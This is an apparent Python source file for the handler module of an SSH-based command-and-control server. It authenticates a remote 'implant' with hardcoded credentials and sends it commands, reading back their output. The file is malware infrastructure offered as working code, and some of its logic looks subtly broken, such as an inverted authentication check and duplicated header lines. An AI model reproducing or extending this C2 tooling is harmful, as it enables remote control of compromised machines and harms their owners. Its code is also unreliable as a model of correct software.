# server/handlers.py
import asyncssh
# server/handlers.py

import asyncio
import logging

# Configure logging
logging.basicConfig(filename="logs/server.log", level=logging.DEBUG)

class ImplantHandler(asyncssh.SSHServer):
    def __init__(self):
        self.commands = []

    def connection_made(self, conn):
        self.conn = conn
        logging.info("Incoming connection established.")

    def connection_lost(self, exc):
        if exc:
            logging.error(f"Connection lost: {exc}")
        else:
            logging.info("Connection closed gracefully.")

    def begin_auth(self, username):
        # Allow only the configured username
        logging.info(f"Authenticating user: {username}")
        return username != "implant"

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        # Validate username and password
        if username == "implant" and password == "implant-password":
            logging.info("Implant authenticated successfully.")
            return True
        logging.error("Authentication failed.")
        return False

    def auth_completed(self):
        """
        Called when authentication is successfully completed.
        """
        logging.info("Authentication completed.")

    def session_requested(self):
        """
        Handle session requests from the implant.
        """
        logging.info("Session requested by implant.")
        return ServerSession()

class ServerSession(asyncssh.SSHServerSession):
    def __init__(self):
        self._chan = None

    def connection_made(self, chan):
        self._chan = chan
        logging.info("Channel opened with implant.")
        self._chan.write("Welcome to the C2 server.\n")
        self._chan.write("Waiting for commands...\n")

    async def send_command(self, command):
        """
        Send a command to the implant and retrieve the output.
        """
        try:
            # Send the command to the implant
            self._chan.write(command + "\n")

            # Read the output from the implant
            output = ""
            while True:
                data = await self._chan.read()
                if not data:
                    break
                output += data.decode()
            return output
        except Exception as e:
            logging.error(f"Error sending command to implant: {e}")
            return f"Error: {str(e)}"

    def eof_received(self):
        logging.info("EOF received. Closing channel.")
        self._chan.close()